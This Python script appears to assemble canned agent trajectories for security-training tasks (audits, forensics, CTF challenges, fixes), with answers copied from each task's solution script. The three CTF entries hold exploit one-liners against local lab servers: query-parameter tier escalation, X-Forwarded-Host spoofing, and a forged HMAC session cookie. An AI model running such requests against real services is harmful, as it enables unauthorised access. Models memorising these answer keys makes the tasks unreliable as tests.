import json, re
from pathlib import Path
T = Path(__file__).resolve().parents[3] / "local_task_extra" / "tasks"
def heredoc(task, target):
    s = (T/task/"solution/solve.sh").read_text()
    m = re.search(r"cat ?> ?" + re.escape(target) + r" <<'(\w+)'\n(.*?)\n\1\n", s, re.S)
    return m.group(2) + "\n"
def fin(path, verify, summary="done"):
    return {"tool": "finish", "path": path, "verify": verify, "summary": summary}
S = {}
# audit: look, then write_json, then finish
for task, marker in [("audit-hardcoded-token", "Credential review"), ("audit-parser-trust-boundary", "Plugin ingestion review"), ("audit-path-normalization", "Export-store assessment")]:
    data = json.loads(heredoc(task, "/app/audit_report.json"))
    S[marker] = [{"tool": "list_dir", "path": "/app"}, {"tool": "write_json", "path": "/app/audit_report.json", "data": data},
                 fin("/app/audit_report.json", "python3 -m json.tool /app/audit_report.json")]
data = json.loads(heredoc("mut-audit-query-gate", "/workspace/review/findings.json"))
S["Query-gate assessment"] = [{"tool": "list_dir", "path": "/workspace/review"}, {"tool": "read_range", "path": "/workspace/review/portal/query_gate.py", "start_line": 1},
    {"tool": "write_json", "path": "/workspace/review/findings.json", "data": data}, fin("/workspace/review/findings.json", "python3 -m json.tool /workspace/review/findings.json")]
# ctf: inspect, probe with python, write flag via shell, finish
py = lambda code: {"tool": "run_shell", "command": "python3 -c " + json.dumps(code)}
S["Export portal challenge"] = [{"tool": "list_dir", "path": "/app"}, {"tool": "read_range", "path": "/app/server.py", "start_line": 1},
    py("import urllib.request;open('/app/flag.txt','wb').write(urllib.request.urlopen('http://127.0.0.1:9139/v1/export?tier=guest&tier=auditor',timeout=5).read())"),
    fin("/app/flag.txt", "cat /app/flag.txt")]
S["Local gateway challenge"] = [{"tool": "list_dir", "path": "/app"}, {"tool": "read_range", "path": "/app/server.py", "start_line": 1},
    py("import urllib.request as u;r=u.Request('http://127.0.0.1:9137/vault',headers={'X-Forwarded-Host':'ops.local'});open('/app/flag.txt','wb').write(u.urlopen(r,timeout=5).read())"),
    fin("/app/flag.txt", "cat /app/flag.txt")]
S["Session desk challenge"] = [{"tool": "list_dir", "path": "/app"}, {"tool": "read_range", "path": "/app/server.py", "start_line": 1},
    py("import hashlib,hmac,urllib.request as u;v='role=auditor';s=hmac.new(b'calendar-2026',v.encode(),hashlib.sha256).hexdigest();r=u.Request('http://127.0.0.1:9138/desk',headers={'Cookie':f'session={v}|{s}'});open('/app/flag.txt','wb').write(u.urlopen(r,timeout=5).read())"),
    fin("/app/flag.txt", "cat /app/flag.txt")]
# forensics: list, read, write_file, finish
for task, marker, target, look in [
    ("forensics-sharded-exfil", "Case 88: shard recovery", "/app/incident_report.txt", "/app/shards"),
    ("forensics-ssh-bruteforce", "SSH authentication triage", "/app/incident_report.txt", "/app/case"),
    ("forensics-webshell-chain", "Web telemetry investigation", "/app/incident_report.txt", "/app/evidence"),
    ("mut-forensics-egress-ledger", "partner-ledger egress", "/var/lib/case-42/conclusion.env", "/var/lib/case-42")]:
    body = heredoc(task, target)
    S[marker] = [{"tool": "list_dir", "path": look}, {"tool": "write_file", "path": target, "content": body}, fin(target, f"cat {target}")]
# fix
S["Profile cache incident"] = [{"tool": "read_range", "path": "/app/profile_cache.py", "start_line": 1},
    {"tool": "replace_text", "path": "/app/profile_cache.py", "old": "    key = user\n", "new": "    key = (tenant, user)\n"},
    fin("/app/profile_cache.py", "python3 -m py_compile /app/profile_cache.py")]
def rewrite(task, target):
    s = (T/task/"solution/solve.sh").read_text()
    m = re.search(r"cat > " + re.escape(target) + r" <<'PY'\n(.*?)\nPY\n", s, re.S)
    return m.group(1) + "\n"
S["Console redirect helper"] = [{"tool": "read_range", "path": "/app/redirector.py", "start_line": 1},
    {"tool": "write_file", "path": "/app/redirector.py", "content": rewrite("fix-redirect-scheme", "/app/redirector.py")},
    fin("/app/redirector.py", "python3 -m py_compile /app/redirector.py")]
S["Archive importer"] = [{"tool": "read_range", "path": "/app/unpack.py", "start_line": 1},
    {"tool": "write_file", "path": "/app/unpack.py", "content": rewrite("fix-zip-slip-extract", "/app/unpack.py")},
    fin("/app/unpack.py", "python3 -m py_compile /app/unpack.py")]
def oldnew(task):
    s = (T/task/"solution/solve.sh").read_text()
    o = re.search(r'old="""(.*?)"""', s, re.S).group(1); n = re.search(r'new="""(.*?)"""', s, re.S).group(1)
    return o, n
o, n = oldnew("mut-fix-inventory-filter")
S["Inventory filter hardening"] = [{"tool": "read_range", "path": "/app/catalog/filter.py", "start_line": 1},
    {"tool": "replace_text", "path": "/app/catalog/filter.py", "old": o, "new": n}, fin("/app/catalog/filter.py", "python3 -m py_compile /app/catalog/filter.py")]
o, n = oldnew("mut-fix-session-lookup")
S["Session lookup repair"] = [{"tool": "read_range", "path": "/app/portal/session_store.py", "start_line": 1},
    {"tool": "replace_text", "path": "/app/portal/session_store.py", "old": o, "new": n}, fin("/app/portal/session_store.py", "python3 -m py_compile /app/portal/session_store.py")]
S["Release hand-off marker"] = [{"tool": "write_file", "path": "/srv/bootstrap/farewell.marker", "content": "Ciao"}, fin("/srv/bootstrap/farewell.marker", "cat /srv/bootstrap/farewell.marker")]
S["Worker readiness beacon"] = [{"tool": "write_file", "path": "/opt/runstate/ready.signal", "content": "Salut"}, fin("/opt/runstate/ready.signal", "cat /opt/runstate/ready.signal")]
json.dump(S, open(Path(__file__).with_name("extra.json"), "w"), ensure_ascii=False, indent=1)
print(len(S))
